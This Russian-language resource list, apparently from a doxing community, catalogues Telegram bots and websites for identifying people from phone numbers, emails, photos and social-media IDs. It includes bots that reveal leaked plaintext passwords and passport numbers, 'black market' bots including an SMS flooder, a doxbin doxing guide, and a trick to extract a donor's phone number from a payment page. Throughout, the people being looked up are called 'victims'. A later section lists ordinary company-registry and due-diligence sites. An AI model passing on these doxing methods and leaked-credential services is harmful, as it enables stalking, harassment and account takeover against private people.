https://t.me/VoiceEffectsBot - меняет тон вашей голосовухи, можно добавить эффекты итп.
https://t.me/roundNoteBot - бот, который превращает любое видео в кругляшку, будто кто то ее сам снял.
https://t.me/ParserFree2Bot - юзабельный бесплатный парсер чатов, на 100% выполняющий свою функцию 
https://t.me/DotaGosuBot - Бот, генерирует оскорбления. 
https://t.me/URL2IMGBot - Бот делает скриншот сайта, по отправленной вами ссылке. [IMG] 
https://t.me/imgurbot_bot - ТГ бот, кидаешь ему картинку, он создаёт ссылку на имгур. [IMG]
====================================================================================================================================================

====================================================================================================================================================
@Smart_SearchBot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.
@Getcontact_Officalbot – показывает как номер телефона записан в контактах других людей
@info_baza_bot – база данных номеров телефона, email
@get_caller_bot - Ищет только по номеру телефона. На выходе: ФИО, дата рождения, почта и «ВКонтакте»
@OpenDataUABot – по коду ЕДРПОУ возвращает данные о компании из реестра, по ФИО — наличие регистрации ФОП
@YouControlBot - полное досье на каждую компанию Украины
@mailseatchbot - По запросу пробива e-mail выдает открытый пароль от ящика если тот есть в базе
@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта
@UAfindbot – База данных Украины
====================================================================================================================================================

====================================================================================================================================================
@FindClonesBot – Поиск человека по фото
@MsisdnInfoBot - Получение сведений о номере телефона
@AVinfoBot - Поиск сведений об автовладельце России
@antiparkon_bot - Поиск сведений об автовладельце
@friendsfindbot - Поиск человека по местоположению
@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России
@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.
@bmi_np_bot - По номеру телефона определяет регион и оператора.
@whoisdombot - пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.
@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook.
@buzzim_alerts_bot - Ищет упоминания ников/каналов в чатах статьях.
@avinfobot - по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.
@VKUserInfo_bot — по ID «ВКонтакте» возвращает расширенную информацию о профиле.
@GetGmail_bot (GetGmail — OSINT email search) — по gmail-почте отдает Google ID, зная который, можно получить архив альбомов Google.
@telesint_bot (TeleSINT) — информация об участии пользователей Telegram в открытых и закрытых группах. Поиск — по нику.
@iptools_robot — бот для быстрого поиска информации о домене и ip адресе. Бот конечно же бесплатный
@phone_avito_bot — найдет аккаунт на Авито по номеру телефона России. Еще бот показывает данные из GetContact.
@Dosie_bot – теперь бот дает еще больше информации. Для нового аккаунта 3 бесплатные полные попытки поиска.
====================================================================================================================================================

====================================================================================================================================================
@egrul_bot - Данный бот пробивает Конторы/ИП. По вводу ФИО/Фирмы предоставляет ИНН объекта; 
учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы.

@get_kontakt_bot- Бот пробивает номер мобильного телефона. 
Как записан запрашиваемый контакт в разных телефонных книжках ваших товарищей/подруг/коллег.

@mailsearchbot - По запросу пробива e-mail бот выдает открытый «password» от ящика. Очень огромная/крутая БД

@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в Фэйсбуке.

@buzzim_alerts_bot - Поисковая система по платформе Telegram. 
Ищет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт.

@AvinfoBot - Бот, который по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.
====================================================================================================================================================

====================================================================================================================================================
Боты черных рынков: 

@Darksalebot

@SafeSocks_Bot

@flood_sms_bot
====================================================================================================================================================

====================================================================================================================================================
1. EGRUL
@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта, 
учредителей бизнеса/партнеров и отчет налоговую декларацию. 
И наоборот: поиск по ИНН выдаст ФИО/конторы. Работает по РФ.

2. BMI NP
@bmi_np_bot - По номеру телефона определяет регион и оператора.
Интересно, что этот бот определяет даже новые номера и определяет номера, которые были перенесены совершенно недавно.

3. WHOIS DOMAIN
@whoisdombot - Пробивает всю основную информацию о нужном домене (адрес сайта), IP и подобное.

4. MAILSEARCH
@mailsearchbot - По запросу e-mail выдает открытый пароль от ящика, если тот есть в базе. 
Очень серьезная база данных. Висит давно, 1.5 млрд учёток, год актуальности ~<2014г.. 
Удобно составлять/вычислять персональные чарсеты с помощью, например, JTR.

5. GETFB
@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на профиль в FaceBook.

6. BUZZIM ALERPTS
@buzzim_alerts_bot - Поисковая система по платформе Telegram. Ищет упоминания ников/каналов в чатах статьях. 
Присутствует функция оповещения, если что-то где-то всплывёт. 
Например, можно посмотреть какие каналы разнесли твои посты с Telegram, проверить ник юзера, где он еще трепался.

7. AVINFO
@avinfobot - По вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru. 
В демо-режиме бесплатно доступно несколько таких поисков/отчетов. Ценник за функционал приличный, 
некоторые хитрожопые юзеры только ради этого бота сбрасывают свой аккаунт в Telegram, 
чтобы бесплатно пробивать своих жертв (бесконечное удаление/регистрация учетки на один и тот же номер телефона).

8. HOWTOFIND
@howtofind_bot - Робот разведчик. Подскажет секреты и приемы OSINT.

9. SMART SEARCH
@smart_searchbot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.



====================================================================================================================================================
Как найти аккаунт в ВК зная e-mail адрес от Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке 
3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) 
4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com 

Работает не со всеми аккаунтами и игнорируйте ссылку на страницу VK Яндекс Музыки!
Как по адресу Яндекс почты найти отзывы на картах Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN 
3. Откройте исходный код страницы (Ctrl+U) 
4, Откройте поиск по странице (Ctrl+F) и введите туда public_id 
5. В результатах поиска будет 2 таких словосочетания, найдите второе 
6. После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать. 
7. Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали) и откройте эту ссылку
==================================================================================================================================================== 

ОЧЕНЬ ХОРОШИЙ САЙТ, КОТОРЫЙ СОДЕРЖИТ ТОННЫ И ТОННЫ ДОКСИНГОВЫХ ИНСТРУМЕНТОВ https://cybertoolbank.cc p.s про него мало кто знает (на английском)

Три самых ахуенных сайта через которые ты можешь дальше развиваться в данной сфере:
https://xss.is/
http://probiv.one/
https://rutor.wtf

https://spyse.com/ — поисковая система по кибербезопасности для получения технической информации, которая обычно используется некоторыми хакерами в киберразведке.

Как найти аккаунт в ВК зная e-mail адрес от Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке 
3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) 
4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com 

Работает не со всеми аккаунтами и игнорируйте ссылку на страницу VK Яндекс Музыки!
Как по адресу Яндекс почты найти отзывы на картах Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN 
3. Откройте исходный код страницы (Ctrl+U) 
4, Откройте поиск по странице (Ctrl+F) и введите туда public_id 
5. В результатах поиска будет 2 таких словосочетания, найдите второе 
6. После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать. 
7. Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали) и откройте эту ссылку.
==================================================================================================================================================== 


Поиск контрагента

https://service.nalog.ru/zd.do - Сведения о юридических лицах, имеющих задолженность по уплате налогов и/или не представляющих налоговую отчетность более года
https://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами
https://service.nalog.ru/uwsfind.do - Сведения о юридических лицах и индивидуальных предпринимателях, в отношении которых представлены документы для государственной регистрации
https://service.nalog.ru/disqualified.do - Поиск сведений в реестре дисквалифицированных лиц
https://service.nalog.ru/disfind.do - Юридические лица, в состав исполнительных органов которых входят дисквалифицированные лица
https://service.nalog.ru/svl.do - Сведения о лицах, в отношении которых факт невозможности участия (осуществления руководства) в организации установлен (подтвержден) в судебном порядке
https://service.nalog.ru/mru.do - Сведения о физических лицах, являющихся руководителями или учредителями (участниками) нескольких юридических лиц

https://fedresurs.ru/ - Единый федеральный реестр юридически значимых сведений о фактах деятельности юридических лиц, индивидуальных предпринимателей и иных субъектов экономической деятельности 

http://rkn.gov.ru/mass-communications/reestr/ – реестры Госкомнадзора.
http://www.chinacheckup.com/ – лучший платный ресурс по оперативной и достоверной верификации китайских компаний.
http://www.dnb.com/products.html - модернизированный ресурс одной из лучших в мире компаний в сфере бизнес-информации Dun and Bradstreet.
http://www.imena.ua/blog/ukraine-database/ – 140+ общедоступных электронных баз данных Украины.
http://www.fciit.ru/ – eдиная информационная система нотариата России.
http://gradoteka.ru/ – удобный сервис статистической информации по городам РФ.
http://www.egrul.ru/ - сервис по поиску сведений о компаниях и директорах из государственных реестров юридических лиц России и 150 стран мира.
http://disclosure.skrin.ru - уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “СКРИН”.
http://1prime.ru/docs/product/disclosure.html – уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “Прайм-ТАСС”.
https://www.cbr.ru/ - информация ЦБ по бюро кредитных историй, внесенных в государственный реестр.
http://www.gks.ru/accounting_report – предоставление данных бухгалтерской отчетности по запросам пользователей от Федеральной службы государственной статистики.
http://www.tks.ru/db/ – таможенные онлайн базы данных.
http://tipodop.ru/ - очередной каталог предприятий, организаций в России.
http://www.catalogfactory.org/ – организации России – финансовые результаты, справочные данные и отзывы. Данные в настоящее время доступны по 4,8 млн.организаций.
http://pravo.ru/ – справочно-информационная система, включающая в настоящее время 40 млн. законодательных, нормативных и поднормативных актов Российской Федерации.
http://azstatus.ru/ – информационная база данных, в которой содержится информация обо всех предпринимателях Российской Федерации, а также информация о российских компаниях (юридические лица). Всего в справочнике более 10 миллионов записей.
http://seldon.ru/ – информационно-аналитическая система, значительно упрощающая и систематизирующая работу с закупками.
http://www.reestrtpprf.ru/ – реестр надежных партнеров от системы Торгово-промышленных палат в Российской Федерации.
http://iskr-a.com/ – сообщество безопасников и платформа для информационного взаимодействия в одном флаконе.
http://www.ruscentr.com/ - реестр базовых организаций российской экономики, добросовестных поставщиков и бюджетоэффективных заказчиков (организаций).
https://www.aips-ariadna.com/ – антикриминальная онлайн система учета по России и СНГ. Относится к тому же ценовому сегменту, что и «Контур Фокус» и т.п., и отличается от других систем большим уклоном в судебные и правоохранительные данные. Ориентирована прежде всего на службу безопасности.
http://188.254.71.82/rds_ts_pub/ – единый реестр зарегистрированных деклараций РФ.
http://croinform.ru/index.php?page=index – сервис проверки клиентов, конкурентов, партнеров и контрагентов в режиме реального времени 24/7, в т.ч. со смартфона. Цены вполне человеческие. Сервис знаменитого Кроноса.
http://www.zakupki.gov.ru/epz/main/public/home.html – официальный сайт Российской Федерации для размещения информации о размещении заказов на поставки товаров, выполнение работ, оказание услуг.
http://rostender.info/ – ежедневная рассылка новых тендеров в соответствии с отраслевыми и региональными настройками.
http://pravo.fso.gov.ru/ – государственная система правовой информации. Позволяет быть в курсе всех новых правовых актов. Имеет удобный поисковик.
http://www.bicotender.ru/ - самая полная поисковая система тендеров и закупок по России и странам СНГ.
http://sophist.hse.ru/ – единый архив экономических и социологических данных по российской Федерации от НИУ ВШЭ.
http://www.tenderguru.ru/ – национальный тендерный портал, представляет собой единую базу государственных и коммерческих тендеров с ежедневной рассылкой анонсов по объявленным тендерам.
http://www.moscowbase.ru/ - поддерживаемые в состоянии постоянной актуальности адресно-телефонные базы данных по компаниям Москвы и России. Уникальным продуктом компании являются базы данных новых компаний, появившихся в течение двух последних кварталов. В данные включается вся стандартная информация, предоставляемая платными онлайн базами, плюс актуальные внутренние телефоны и e-mail.
http://www.credinform.ru/ru-RU/globas - информационно-аналитическая система ГЛОБАС – I содержит данные о семи миллионах компаний. Предназначена для комплексной информационной поддержке бизнеса и создания комплексных аналитических отчетов.
http://www.actinfo.ru/ – отраслевой бизнес-справочник предприятий России по их актуальным почтовым адресам и контактным телефонам. Единственный справочник, который включает контактные данные по предприятиям, созданным в предыдущем квартале.
http://www.sudrf.ru/ -государственная автоматизированная система РФ «Правосудие».
http://docs.pravo.ru/ – справочно-правовая система Право.ру. Предоставляет полный доступ к нормативным документам любых субъектов Российской Федерации, а также к судебной практике арбитражных судов и мнениям экспертов любых юридических областей. Ежемесячная плата для работы с полной базой документов составляет 500 руб.
http://www.egrul.com/ – платные и бесплатные сервисы поиска по ЕГРЮЛ, ЕГРИП, ФИО, балансам предприятий и др. параметрам. Одно из лучших соотношений цены и качества.
http://www.fedresurs.ru/ – единый федеральный реестр сведений о фактах деятельности юридических лиц.
http://www.findsmi.ru/ – бесплатный сервис поиска данных по 65 тыс. региональных СМИ.
http://hub.opengovdata.ru/ – хаб, содержащий открытые государственные данные всех уровней, всех направлений. Проект Ивана Бегтина.
http://www.ruward.ru/ – ресурс агрегатор всех рейтингов Рунета. В настоящее время уже содержит 46 рейтингов и более 1000 компаний из web и PR индустрии.
http://www.b2b-energo.ru/firm_dossier/ - информационно-аналитическая и торгово-операционная система рынка продукции, услуг и технологий для электроэнергетики.
http://opengovdata.ru/ – открытые базы данных государственных ресурсов
http://bir.1prime.ru/ – информационно-аналитическая система «Бир-аналитик» позволяет осуществлять поиск данных и проводить комплексный анализ по всем хозяйствующим субъектам России, включая компании, кредитные организации, страховые общества, регионы и города.
http://www.prima-inform.ru/ – прямой доступ к платным и бесплатным информационным ресурсам различных, в т.ч. контролирующих организаций. Позволяет получать документы и сводные отчеты, информацию о российских компаниях, индивидуальных предпринимателях и физических лицах, сведения из контролирующих организаций. Позволяет проверять субъектов на аффилированность и многое другое.
http://www.integrum.ru/ –портал для конкурентной разведки с самым дружественным интерфейсом. Содержит максимум информации, различных баз данных, инструментов мониторинга и аналитики. Позволяет компании в зависимости от ее нужд, размеров и бюджета выбирать режим пользования порталом.
www.spark-interfax.ru – портал обладает необходимой для потребностей конкурентной разведки полнотой баз данных, развитым функционалом, постоянно добавляет новые сервисы.
https://fira.ru/ – молодой быстроразвивающийся проект, располагает полной и оперативной базой данных предприятий, организаций и регионов. Имеет конкурентные цены.
www.skrin.ru – портал информации об эмитентах ценных бумаг. Наряду с обязательной информацией об эмитентах содержит базы обзоров предприятий, отраслей, отчетность по стандартам РБУ, ГААП, ИАС. ЗАО “СКРИН” является организацией, уполномоченной ФСФР.
http://www.magelan.pro/ – портал по тендерам, электронным аукционам и коммерческим закупкам. Включает в себя качественный поисковик по данной предметной сфере.
http://www.kontragent.info/ – ресурс предоставляет информацию о реквизитах контрагентов и реквизитах, соответствующих ведению бизнеса.
http://www.ist-budget.ru/ – веб-сервис по всем тендерам, госзаказам и госзакупкам России. Включает бесплатный поисковик по полной базе тендеров, а также недорогой платный сервис, включающий поиск с использованием расширенных фильтров, по тематическим каталогам. Кроме того, пользователи портала могут получать аналитические отчеты по заказчикам и поставщикам по тендерам. Есть и система прогнозирования возможных победителей тендеров.
http://www.vuve.su/ - портал информации об организациях, предприятиях и компаниях, ведущих свою деятельность в России и на территории СНГ. На сегодняшний день база портала содержит сведения о более чем 1 млн. организаций.
http://www.disclosure.ru/index.shtml - система раскрытия информации на рынке ценных бумаг Российской Федерации. Включает отчетность эмитентов, существенные новости, отраслевые обзоры и анализ тенденций.
http://www.mosstat.ru/index.html – бесплатные и платные онлайн базы данных и сервисы по ЕГРПО и ЕГРЮЛ Москвы и России, а также бухгалтерские балансы с 2005 года по настоящее время. По платным базам самые низкие тарифы в Рунете. Хорошая навигация, удобная оплата, качественная и оперативная работа.
http://www.torg94.ru/ – качественный оперативный и полезный ресурс по госзакупкам, электронным торгам и госзаказам.
http://www.k-agent.ru/ – база данных «Контрагент». Состоит из карточек компаний, связанных с ними документов, списков аффилированных лиц и годовых бухгалтерских отчетов. Документы по компаниям представлены с 2006 г. Цена в месяц 900 руб. Запрашивать данные можно на сколь угодно много компаний.
http://www.is-zakupki.ru/ – информационная система государственных и коммерческих закупок. В системе собрана наиболее полная информация по государственным, муниципальным и коммерческим закупкам по всей территории РФ. Очень удобна в работе, имеет много дополнительных сервисов и, что приятно, абсолютно разумные, доступные даже для малого бизнеса цены.
http://salespring.ru/ – открытая пополняемая база данных деловых контактов предприятий России и СНГ и их сотрудников. Функционирует как своеобразная биржа контактов.
www.multistat.ru – многофункциональный статистический портал. Официальный портал ГМЦ Росстата.
http://sanstv.ru/photomap/ (поиск фото по геометкам в соц. сетях)
Карта движения судов в реальном времени: https://www.marinetraffic.com
Карта движения судов в реальном времени: https://seatracker.ru/ais.php
Карта движения судов: http://shipfinder.co/
Отслеживание самолетов: https://planefinder.net/
Отслеживание самолетов: https://www.radarbox24.com/
Отслеживание самолетов: https://de.flightaware.com/
Отслеживание самолетов: https://www.flightradar24.com

Общий поиск по соц. сетям, большой набор разных инструментов для поиска:
- http://osintframework.com/
https://findclone.ru/- Лучшая доступная технология распознавания лиц (документация)

Поиск местоположения базовой станции сотового оператора:
- http://unwiredlabs.com
- http://xinit.ru/bs/

https://www.reestr-zalogov.ru/search/index - Реестр уведомлений о залоге движимого имущества
https://мвд.рф/wanted - Внимание, розыск! можно порофлить тут или кинуть еблет жертвы в подслушку города хаххахахахахахахха
https://www.mos.ru/karta-moskvicha/services-proverka-grazhdanina-v-reestre-studentov/ - Проверка гражданина в реестре студентов/ординаторов/аспирантов (держатели карты москвича)
http://esugi.rosim.ru - Реестр федерального имущества Российской Федерации
pd.rkn.gov.ru/operators-registry - Реестр операторов, осуществляющих обработку персональных данных
bankrot.fedresurs.ru - Единый федеральный реестр сведений о банкротстве.
==================================================================================================================================================== 
▫️ Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб версия поиска по любому номеру телефона, поиск по почте
▫️ Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах
▫️ Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона
▫️ Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона
▫️ Bases-brothers (https://bases-brothers.ru/) — поиск номера в объявлениях
▫️ Microsoft (http://account.live.com/) — проверка привязанности номера к microsoft аккаунту
▫️ Avinfo.guru (https://avinfo.guru/) — проверка телефона владельца авто, иногда нужен VPN
▫️ Telefon.stop-list (http://telefon.stop-list.info/) — поиск по всем фронтам, иногда нет информации
▫️ @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
▫️ Rosfirm (https://gutelu.rosfirm.info/) — найдет ФИО, адрес прописки и дату рождения, нужно знать город
▫️ Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
▫️ @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
▫️ Spiderfoot (https://www.spiderfoot.net/) — автоматический поиск с использованием огромного количества методов, ножно использовать в облаке если пройти регистрацию
▫️ Locatefamily (https://www.locatefamily.com/) — поиск адреса и ФИО
▫️ Nuga — поиск instagram
▫️ Live.com (http://account.live.com/) — Проверка привязки к майкрософт
▫️ Telefon (http://telefon.stop-list.info/) — Поиск по всем фронтам
▫️ @FindNameVk_bot (https://t.me/@FindNameVk_bot) — Бот ищет историю смены фамилий профиля по открытым источникам, указывает дату создания аккаунта.
▫️ @InfoVkUser_bot (https://t.me/@InfoVkUser_bot) — Бот позволяет провести анализ друзей профиля.
==================================================================================================================================================== 

1. https://regvk.com - узнать цифровой ID человека ВКонтакте.
2. https://rusfinder.pro/vk/user/id********* (здесь цифровой ID) - узнать данные указанные при регистрации аккаунта ВКонтакте.
Если ничего старого нет, обновите страницу и быстро делайте скрин области. С новорегами не работает.
3. http://archive.fo - просмотреть web-архив страницы. Редко помогает.
4. https://220vk.com - посмотреть скрытых друзей пользователя ВКонтакте. Работает только со старыми страницами, закрытые профили не чекает.
5. Ошибка <h1>503 Bad Gateway</h1> на DonatePay/DonationAlerts.
Если пользователь использует донат-сервисы, вы можете попытаться узнать его номер сделав ошибку через просмотр кода элемента на странице оплаты. Работает по сей день.
6. https://zhuteli.rosfirm.info - одна из баз данных адресов. Многих городов нет, ищем по районному центру.
7. https://nomer.org - одна из баз данных адресов. Есть множество городов, поиск только по фамилии.
8. https://spravochnik-sng.com - база данных адресов, телефонов, а также сервис по установлению родственных связей.
9. https://mirror.bullshit.agency - сервис пробива адресов по номеру телефона, указанному на Авито. Работает в 70% случаев.
10. https://phoneradar.ru - узнать город по номеру телефона.
Если не удается найти адрес, можно узнать хотя бы город/районный центр и сузить круг поисков.
11. Приложение VKInfo или Group боты - позволяют узнать созданные группы на странице, отсеять старые никнеймы.
12. https://lampyre.io - узнать страницы социальных сетей и пароли по номеру телефона или почте. Доступно 4 пробива на 1 аккаунт.
Абузим с помощью http://temp-mail.org. Помимо веб-сервиса, доступна программа с расширенным функционалом (например поиск билетов Аэрофлота).
Позволяет строить графики.
13. https://www.maltego.com - расширенный аналог Lampyre. Не веб-сервис, софт. Чтобы скачать, опускаемся вниз сайта.
После установки, выбираем функционал Maltego CE. Позволяет строить графики.
14. https://www.palantir.com - данные о западных организациях.
Подойдет для деанонимизаций родственников пользователя из ближней Европы (Латвия, Литва, Польша, Финляндия, Эстония). Позволяет строить графики.
15. https://vk.watch - помогает узнать, как выглядела страница ВКонтакте за разные промежутки времени. Подписка стоит 3,6 евро.
16. https://ytch.ru/  - помогает узнать историю изменений на канале YouTube.
17. Telegram @mailsearchbot - помогает узнать пароли жертвы по номеру телефона, почте, никнейму. Без подписки показывает неполностью, но подобрать можно.
18. Telegram @EyeGodsBot - помогает узнать привязки, а также имеет эксклюзивную функцию поиска по фото всего за 5 рублей по подписке.
19. Telegram @AvinfoBot - помогает узнать владельца автомобиля по госномеру, проверить историю продажи автомобиля, проверить автомобиль на участие в ДТП и многое другое.
20. Telegram @FindNameVk_bot - позволяет узнать историю изменений имени пользователя в ВК.
==================================================================================================================================================== 
Список способов поиска в социальных сетях. Некоторые связки.

1. Имя (без фамилии) + город (районный центр/поселок/село) + дата рождения (число).
2. ИФ + город (путем отсеивания результатов).
3. Город (районный центр) + полная дата рождения.
4. Поиск родственников по фамилии (если известен возраст, в фильтрах ставим возраст ОТ по арифметической формуле 18+{полный возраст жертвы}), далее поиск в друзьях странных имен, ников (если не удается найти старые страницы по настоящим данным).
5. Идентификатор канала на YouTube в Google (позволяет узнать старое название канала).
==================================================================================================================================================== 
Боты черных рынков:
@Darksalebot
@SafeSocks_Bot
@flood_sms_bot
==================================================================================================================================================== 
@GetGmail_bot - Полезнейший инструмент, способный узнать ФИ по почте Gmail
psbdmp.ws - Поиск в текстах pastebin
Гайд по забугор доксингу - https://doxbin.org/upload/doxingguide

intext:(любые данные) - например url вконтакте и находит полную информацию о человеке, ибо все сайты лайкеры и остальные сайты
сохраняют информацию о человекею.
Пример:
intext:jfsjjsdlskdkfjd - писать в гугле и вылезут все данные.
==================================================================================================================================================

Полезные ресурсы для пробива.
http://results.audit.gov.ru/ – портал открытых данных Счетной палаты Российской Федерации.
http://sudact.ru/ – ресурс по судебным и нормативным актам, включающим решения судов общей юрисдикции, арбитражных судов и мировых судей с качественным удобным поисковиком.
http://www.cbr.ru/credit/main.asp – справочник по кредитным организациям. Сведения ЦБ РФ о банках и прочих кредитных организациях, об отзывах лицензий на осуществление банковских операций и назначениях временных администраций, раскрытие информации и пр.
https://service.nalog.ru/inn.do – сервис определения ИНН физического лица.
https://service.nalog.ru/bi.do – сервис позволяет выяснить, заблокированы или нет банковские счета конкретного юридического лица или индивидуального предпринимателя.
http://188.254.71.82/rds_ts_pub/ – национальная часть единого реестра зарегистрированных таможенных деклараций, позволяющая определить кто, что, когда и откуда привез в нашу страну.
http://services.fms.gov.ru/ – проверка действительности паспортов и другие сервисы от ФМС России.
http://zakupki.gov.ru/223/dishonest/public/supplier-search.html – реестр недобросовестных поставщиков.
http://fedsfm.ru/documents/terrorists-catalog-portal-act – ресурс позволяет проверить, не являются ли ваши клиенты, контрагенты, конкуренты, и не дай бог, партнеры террористами или экстремистами.
http://www.stroi-baza.ru/forum/index.php?showforum=46 - «черный список» по российским строительным компаниям.
http://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/ – единая база данных решений судов общей юрисдикции РФ.
http://web-compromat.com/service.html – набор сайтов, облегчающих проверку компаний и физических лиц.
http://www.centerdolgov.ru/ – информация о недобросовестных компаниях-должниках России, Украины, Белоруссии, Казахстана. Поиск возможен по названию компаний, ИНН, стране и городу.
http://www.egrul-base.ru/ - проверка клиентов, контрагентов, конкурентов за 15-30 минут. Проверка включает в себя поиск по «черным спискам», определение фактического хозяина бизнеса, связи компании, ее учредителей, генерального директора с другими организациями. Информация из ЕГРЮЛ. Цена 500 руб.
http://ras.arbitr.ru/ -Высший арбитражный суд РФ с картотекой арбитражных дел и банком решения арбитражных судов.
http://bankrot.fedresurs.ru/ – единый федеральный реестр сведений о банкротстве.
http://sts.gov.ua/businesspartner - лучший сервис проверки контрагентов, клиентов, конкурентов в Украине от Налоговой службы страны. Позволяет проверять юридическое лицо не только по собственным данным налоговой службы, но и другим открытым базам данных государственных порталов Украины. В России такого пока нет.
https://rosreestr.ru/wps/portal/cc_information_online – справочная информация по объектам недвижимости в режиме он-лайн от Федеральной службы государственной регистрации, кадастра и картографии.
http://www.nomer.org/moskva/ – телефонная база г.Москвы. Содержит адреса и телефоны всех московских квартир, в которых установлен телефон, и не только МГТС.
http://www.nomer.org/ - телефонный справочник городов России и СНГ
http://spravkaru.net/ – онлайн телефонный справочник по городам и регионам России.
http://www.info4help.com/ - телефонный справочник городов России (не проверялась, платная)
http://www.voditeli.ru/ - база данных о водителях грузовых автомашин, создана с целью выявления "хронических" летунов, алкоголиков, ворья и прочих.
http://telbase.spb.ru/ - Адресная и телефонная база Санкт-Петербурга (не проверялась, платная)
http://tapix.ru -Телефонный справочник городов России и бывших республик СССР (не проверялась, платная)
http://rossvyaz.ru/activity/num_resurs/registerNum/ – полезный поисковик, позволяющий определить оператора по номеру или фрагменту номера телефона оператора, месторасположение и т.п. За наводку спасибо Vinni.
http://www.rospravosudie.com/ – поисковик-сервис по судебным решениям в России. Содержит все опубликованные судебные решения, список судей Российской Федерации, а также список действующих адвокатов. По каждому судье можно посмотреть списки его решений. Предоставляет статистику преступлений по регионам. Является некоммерческим проектом.
http://www.salyk.kz/ru/taxpayer/interaktiv/Pages/default.aspx – официальный портал Налогового комитета Министерства финансов республики Казахстан. Располагает рядом удобных сервисов, включая реестр плательщиков НДС, поиск налогоплательщиков в республике и проч.
https://focus.kontur.ru/ - лучший в Рунете по соотношению цены и качества сервис проверки клиентов, контрагентов и т.п. , пользуясь официальными источниками статистики. Наряду с получением данных по отдельной организации позволяет в качестве дополнительной опции искать аффилированные между собой организации, а также пересечение по генеральным директорам, собственникам и т.п.
Федеральная Информационная Адресная Система – позволяет установить наличие или отсутствие любого адреса в любом месте в стране. Если точно такого адреса нет, то система выдаст наиболее близкие.
http://alexandr-sel.livejournal.com/33499.html#cutid1 – исчерпывающая и структурированная база ресурсов для проверки компаний на территории Республики Беларусь.
http://fellix13.livejournal.com/6683.html – необходимый набор ресурсов для проверки конрагентов на Украине от Сергея Коржова.
http://mbcredit.ru/ – в группу компаний Cronos входят ЗАО МБКИ, которое предоставляет качественные бизнес-справки и в режиме он-лайн осуществляет проверку кредитных историй по любым компаниям и персоналиям по конкурентным ценам , а также многое другое. Цены вполне конкурентные.
ttp://cases.pravo.ru/ – картотека арбитражных дел. При помощи сервиса вы получаете доступ к любому делу в любом арбитражном суде. Достаточно указать известные вам параметры. Искать надо при помощи правой колонки. Поиск можно вести по участникам дела (название организации или ИНН), по фамилии судьи, по номеру дела, фильтровать по датам.
http://www.gcourts.ru/ – поисковик и одновременно справочник от Yandex по судам общей юрисдикции. Позволяет искать по номерам дел, ответчикам, истцам, отслеживать прохождение дел по всем инстанциям. Просто неоценимый инструмент для безопасников и разведчиков.
https://service.nalog.ru/debt/ – сервис «Узнай свою задолженность» позволяет пользователям узнавать не только свою задолженность, но осуществлять поиск информации о задолженности по имущественному, транспортному, земельному налогам, налогу на доходы физических лиц, граждан РФ.
http://www.law-soft.ru/ – информация о предприятиях, находящихся в стадии банкротства, обобщается из «Коммерсанта», «Российской газеты». Информация с 2007 года по настоящее время. Через расширенный поиск Yandex отлично ищется по сайту.
http://egrul.nalog.ru/ – отсюда можно почерпнуть сведения, внесенные в Единый Государственный Реестр Юридических Лиц.
http://www.e-disclosure.ru/ – сервер раскрытия информации по эмитентам ценных бумаг РФ.
http://www.fssprus.ru/ – картотека арбитражных дел Высшего Арбитражного Суда Российской Федерации
http://www.mgodeloros.ru/register/search/ – база данных должников, в которой зарегистрированы все физические и юридические лица как частного, так и публичного права (кроме государственных и органов местного самоуправления, а также тех субъектов, имущество которых сдано в ипотеку или в заклад), в отношении которых начата процедура принудительного исполнения.
